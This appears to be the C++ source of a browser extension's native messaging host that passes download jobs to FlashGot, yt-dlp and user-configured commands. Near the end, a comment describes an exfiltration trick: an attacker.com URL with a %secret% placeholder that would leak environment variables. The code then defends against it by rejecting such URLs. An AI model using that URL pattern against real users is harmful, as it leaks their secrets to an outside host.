//TODO: make stdout binary in flashgot nativehost
//TODO: make flashgot nativehost message lenght logic like this one
//TODO: make sure everything is x86
//TODO: check licence of programs for redistribution
//TODO: vc++ 2015 is needed for yt-dlp(x86)
//TODO: change main to int _tmain(int argc, TCHAR *argv[]) in flashgot too

//policies
//nothing is allowed to consume an exception except for main()
//if a function wants to catch an exception it must rethrow it
//except for main functions of threads, they MUST consume their own exception
//all thread main function names should end with _th
//all thread main functions should have their whole body enclosed in a try-catch

#include "stdafx.h"
#include <iostream>
#include <string>
#include <fstream>
#include <fcntl.h>
#include <io.h>
#include <thread>
#include "grabby_native_app.h"
#include "utils.h"
#include "messaging.h"
#include "exceptions.h"
#include "ytdl_args.h"
#include "defines.h"
#include "base64.hpp"
#include <gzip/compress.hpp>

using namespace std;
using namespace ggicci;
using namespace base64;

map<string, bool> ytdlKillSwitches;
string versionStr = "0.61.0";

int wmain(int argc, WCHAR *argv[], WCHAR *envp[])
{
	//initializations
	try{
		plog::init(plog::debug, "log.txt", 1000*1000, 2);
		setupStdin();
	}
	catch(exception &e)
	{
		try{
			messaging::sendMessage(MSGTYP_ERR, e.what());
			PLOG_FATAL << e.what();
		}catch(...){}
		exit(EXIT_FAILURE);
	}
	//same just for unknown exceptions
	catch(...)
	{
		try{
			messaging::sendMessage(MSGTYP_ERR, "A fatal error has occurred");
			PLOG_FATAL << "A fatal error has occurred";
		}catch(...){}
		exit(EXIT_FAILURE);
	}

	PLOG_INFO << "starting native host";

	//the loop for sending/receiving messages
    while(true)
	{
		try
		{
			string raw_message = messaging::get_message();
			PLOG_INFO << "received message: " << raw_message;
			Json msg = utils::parseJSON(raw_message);
			processMessage(msg);
		}
		catch(fatal_exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_FATAL << e.what();
			}catch(...){}
			//we exit after a fatal exception because otherwise the infinite loop will run rapidly
			exit(EXIT_FAILURE);
		}
		catch(exception &e)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, e.what());
				PLOG_ERROR << e.what();
			}catch(...){}
		}
		//same just for unknown exceptions
		catch(...)
		{
			try{
				messaging::sendMessage(MSGTYP_ERR, "An unknown error has occurred");
				PLOG_ERROR << "An unknown error has occurred";
			}catch(...){}
		}

    }
}

//sets stdin to binary mode
void setupStdin()
{
	int res1 = _setmode( _fileno( stdin ), _O_BINARY );
	int res2 = _setmode( _fileno( stdout ), _O_BINARY );
	if( res1 == -1 || res2 == -1){
		throw fatal_exception("cannot set stdin mode to binary");
	}
}

//using the reference of the Json object because pass by value caused exception because of copy constructor error
void processMessage(const Json &msg)
{
	try
	{
		string type = msg["type"].AsString();

		if(type == MSGTYP_GET_VERSION)
		{
			handle_getversion(msg);
		}
		else if(type == MSGTYP_GET_AVAIL_DMS)
		{
			handle_getavail(msg);
		}
		else if(type == MSGTYP_DOWNLOAD)
		{
			handle_download(msg);
		}
		else if(type == MSGTYP_USER_CMD)
		{
			handle_userCMD(msg);
		}
		else if(type == MSGTYP_YTDL_INFO)
		{
			handle_ytdlinfo(msg);
		}
		else if(type == MSGTYP_YTDL_GET)
		{
			handle_ytdlget(msg);
		}
		else if(type == MSGTYP_YTDL_KILL)
		{
			handle_ytdlkill(msg);
		}
		else
		{
			messaging::sendMessage(MSGTYP_UNSUPP, "Unsupported message type");
		}
	}
	catch(grb_exception &e)
	{
		throw e;
	}
	catch(exception &e)
	{
		string msg = "Error in processing message: ";
		msg.append(e.what());
		throw grb_exception(msg.c_str());
	}
}

void handle_getversion(const Json &msg)
{
	Json version = Json::Parse("{}");
	version.AddProperty("type", Json("version"));
	version.AddProperty("version", Json(versionStr));
	messaging::sendMessage(version);
}

//handles "get_available_dms" request
void handle_getavail(const Json &msg)
{
	//TODO: output this directly from flashgot.exe
	vector<string> args;
	process_result res = utils::launchExe("grabby_flashgot.exe", args);

	if( res.exitCode != 0 || res.output.length() == 0 )
	{
		throw grb_exception("No output from grabby_flashgot.exe");
	}

	PLOG_INFO << "fg output be: " << res.output;

	Json dmsJSON = utils::parseJSON(res.output.c_str());
	Json avail = Json::Parse("{}");
	avail.AddProperty("type", Json("available_dms"));
	Json dms = Json::Parse("[]");
	for(int i=0; i<dmsJSON.Size(); i++)
	{
		if(dmsJSON[i]["available"].AsBool())
		{
			string name = dmsJSON[i]["name"].AsString();
			dms.Push(Json(name));
		}
	}
	avail.AddProperty("availableDMs", dms);
	messaging::sendMessage(avail);
}

//handles "download" request
void handle_download(const Json &msg)
{
	try
	{
		const Json &job = msg["job"];
		string jobJSON = job.ToString();
		flashgot_job(jobJSON);
	}
	catch(grb_exception &e)
	{
		messaging::sendMessage(MSGTYP_ERR, e.what());
		PLOG_ERROR << e.what();
	}
}

//handled user-specified download manager cmd
//TODO: Json library cannot handle double quotes in strings
// for example {"name": "\"jack\""} becomes \"jack\" instead of just "jack"
void handle_userCMD(const Json &msg)
{
	try
	{
		string exeName = msg["procName"].AsString();
		string cmd = msg["cmd"].AsString();
		string filename = msg["filename"].AsString();
		bool showConsole = msg["showConsole"].AsBool();
		bool showSaveas = msg["showSaveas"].AsBool();
		cmd = from_base64(cmd);

		std::thread th1(custom_command_th, exeName, cmd, filename, showConsole, showSaveas);
		th1.detach();
	}
	catch(grb_exception &e)
	{
		messaging::sendMessage(MSGTYP_ERR, e.what());
		PLOG_ERROR << e.what();
	}
}

void handle_ytdlinfo(const Json &msg)
{
	string url = msg["url"].AsString();
	string dlHash = msg["dlHash"].AsString();

	ytdl_args *arger = new ytdl_info(msg);

	std::thread th1(ytdl_info_th, url, dlHash, arger);
	th1.detach();
}

void handle_ytdlget(const Json &msg)
{
	string url = msg["url"].AsString();
	string dlHash = msg["dlHash"].AsString();
	string type = msg["subtype"].AsString();

	string filename = "";
	if(msg.Contains("filename"))
	{
		filename = msg["filename"].AsString();
	}

	ytdl_args *arger;

	if(type == YTDLTYP_VID)
	{ 
		arger = new ytdl_video(msg);
	}
	else if(type == YTDLTYP_AUD)
	{
		arger = new ytdl_audio(msg);
	}
	else if(type == YTDLTYP_PLVID)
	{
		arger = new ytdl_playlist_video(msg);
	}
	else if(type == YTDLTYP_PLAUD)
	{
		arger = new ytdl_playlist_audio(msg);
	}

	std::thread th1(ytdl_get_th, url, dlHash, arger, filename);
	th1.detach();
}

void handle_ytdlkill(const Json &msg)
{
	string dlHash = msg["dlHash"].AsString();
	ytdlKillSwitches[dlHash] = true;
}

//launches FlashGot to perform a download with a DM
void flashgot_job(const string &jobJSON)
{
	try
	{
		vector<string> args;
		args.push_back("download");
		process_result res = utils::launchExe("grabby_flashgot.exe", args, jobJSON);
		if(res.exitCode != 0)
		{
			string msg = res.output + " - exit code: " + std::to_string(res.exitCode);
			throw grb_exception(msg.c_str());
		}
	}
	catch(exception &e)
	{
		string msg = "Error in FlashGot execution: ";
		msg.append(e.what());
		throw grb_exception(msg.c_str());
	}
}

void custom_command_th(const string exeName, string cmd, const string filename, bool showConsole, bool showSaveas)
{
	try
	{
		string savePath = "";
		string placeholder = "*$*OUTPUT*$*";

		// if output is specified in the command line then we have to have a save as dialog 
		// becuase it's meaningless without it
		if(cmd.find(placeholder) != string::npos)
		{
			showSaveas = true;
		}

		if(showSaveas)
		{
			if(cmd.find(placeholder) == string::npos)
			{
				throw grb_exception("You have enabled the save-as dialog but you haven't specified [OUTPUT] in your arguments");
			}

			savePath = utils::fileSaveDialog(filename);

			// if user chose cancel in browse dialog do nothing
			if(savePath.length() == 0)
			{
				return;
			}

			cmd.replace(cmd.find(placeholder), placeholder.length(), savePath);
		}

		utils::runCmd(exeName, cmd, showConsole);

	}
	catch(exception &e)
	{
		string msg = "Error executing custom command: ";
		msg.append(e.what());
		messaging::sendMessage(MSGTYP_ERR_GUI, msg);
	}
	catch(...){}	//ain't nothing we can do if we're here

}

void ytdl_info_th(const string url, const string dlHash, ytdl_args *arger)
{
	try
	{
		vector<string> args = arger->getArgs();
		process_result res = ytdl(url, dlHash, args);

		vector<string> lines = utils::strSplit(res.output, '\n');

		Json info;
		string type = MSGTYP_YTDL_INFO;

		try
		{
			//if it's a playlist
			if(lines.size() > 1)
			{
				type = MSGTYP_YTDL_INFO_YTPL;
				Json infoTmp = Json::Parse("[]");

				//we have a for loop because playlists are outputted as one line of JSON for each list item
				for(int i=0; i<lines.size(); i++)
				{
					Json j = utils::parseJSON(lines[i].c_str());
					infoTmp.Push(j);
				}

				//we do this because sometimes JSON gets very big, specially for playlists
				string infoStr = infoTmp.ToString();

				//gzip the string and then base64 it and then send
				const char * pointer = infoStr.data();
				size_t size = infoStr.size();
				string comp = gzip::compress(pointer, size, 9);
				string infoB64 = to_base64(comp);
				info = Json(infoB64);
			}
			else
			{
				info = utils::parseJSON(lines[0]);

				//remove big unused things from info to avoid JSON getting to big for native messaging
				if(info.Contains("automatic_captions")){
					info.Remove("automatic_captions");
				}
				if(info.Contains("subtitles")){
					info.Remove("subtitles");
				}
				if(info.Contains("categories")){
					info.Remove("categories");
				}
				if(info.Contains("requested_formats"))
				{
					info.Remove("requested_formats");
				}
				if(info.Contains("tags"))
				{
					info.Remove("tags");
				}
				if(info.Contains("description"))
				{
					info.Remove("description");
				}

			}
		}
		catch(...)
		{
			//YTDL output not JSON
			//Happens when YTDL outputs an error
			info = Json(res.output);
			PLOG_ERROR << "youtube-dl returned an error" << res.output;
		}

		Json msg = Json::Parse("{}");
		msg.AddProperty("type", Json(type));
		msg.AddProperty("dlHash", Json(dlHash));
		msg.AddProperty("info", info);

		messaging::sendMessage(msg);
	}
	catch(...){}	//ain't nothing we can do if we're here

	delete arger;
}

void ytdl_get_th(const string url, const string dlHash, ytdl_args *arger, const string filename)
{
	try
	{
		string savePath = "";

		// if it's a single video
		if(filename.length() > 0)
		{
			savePath = utils::fileSaveDialog(utils::sanitizeFilename(filename.c_str()));
			if(savePath.length() > 0){
				savePath.append(".%(ext)s");
			}
		}
		// if it's a playlist
		else
		{
			savePath = utils::folderOpenDialog();
			if(savePath.length() > 0){
				savePath.append("%(title)s.%(ext)s");
			}
		}

		// if user chose cancel in browse dialog do nothing
		if(savePath.length() == 0)
		{
			delete arger;
			return;
		}

		arger->addArg("--output");
		arger->addArg(savePath);

		output_callback callback(dlHash);
		vector<string> args = arger->getArgs();
		process_result res = ytdl(url, dlHash, args, &callback);

		string type;
		if(res.exitCode == YTDL_CANCEL_CODE) type = MSGTYP_YTDL_KILL;
		else if(res.exitCode == 0) type = MSGTYP_YTDL_COMP;
		else type = MSGTYP_YTDL_FAIL;

		Json msg = Json::Parse("{}");
		msg.AddProperty("type", Json(type));
		msg.AddProperty("dlHash", Json(dlHash));
		messaging::sendMessage(msg);
	}
	catch(exception &e)
	{
		string msg = "Error downloading video: ";
		msg.append(e.what());
		messaging::sendMessage(MSGTYP_ERR, msg);
	}
	catch(...){}	//ain't nothing we can do if we're here

	delete arger;
}

process_result ytdl(const string &url, const string &dlHash, vector<string> &args, output_callback *callback)
{
	try
	{
		//an attacker could make the user request a malicious URL and steal environment variables from them
		//for example if the users tries to download https://attacker.com/script.php?secret=%secret% then upon 
		//receiving this command line argument youtubedl will replace %secret% with the corresponding env. variable value
		//and send it to the attacker
		//not really a huge deal because nobody should put secrets in environment variables anyway and also
		//we are url-encoding our URLs so it would be difficult to come up with a URL that would leak an actual env. var
		//but not impossible
		//this could also happen by accident leading to undefined behavior
		//so we search the URL and if we find any env. variables in it we just reject it
		if(utils::strHasEnvars(url))
		{
			throw grb_exception("This URL is not supported");
		}

		//create a kill switch for this download and store it in the map
		ytdlKillSwitches.insert(pair<string, bool>(dlHash, false));
		bool &killSwitch = ytdlKillSwitches[dlHash];

		process_result res = utils::launchExe("yt-dlp.exe", args, "", killSwitch, callback);

		ytdlKillSwitches.erase(dlHash);

		return res;
	}
	catch(exception &e)
	{
		string msg = "Error in YoutubeDL execution: ";
		msg.append(e.what());
		throw grb_exception(msg.c_str());
	}
}